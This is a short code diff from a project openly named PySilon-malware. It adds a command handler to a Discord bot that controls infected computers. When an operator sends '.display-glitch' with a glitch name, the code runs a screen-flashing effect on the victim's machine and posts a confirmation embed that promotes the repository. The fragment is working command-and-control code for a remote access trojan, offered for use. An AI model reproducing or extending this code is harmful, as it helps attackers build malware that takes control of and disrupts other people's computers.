@@ -29,6 +29,11 @@ elif message.content == '.display-glitch':
         embed = discord.Embed(title="📃 List of currently available glitches:", description=f'- {"- ".join(flash_screen("list"))}\n`NOTE: This list will dramatically increase it\'s size in release v4.1`', colour=discord.Colour.blue())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
+    elif message.content.replace('.display-glitch ', '') + '\n' in flash_screen('list'):
+        flash_screen(message.content.replace('.display-glitch ', ''))
+        embed = discord.Embed(title="🟢 Glitch succesfully executed", description=f'Remember to ⭐ our repository', colour=discord.Colour.blue())
+        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
+        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
 
 
 elif expectation == 'graphic_file':
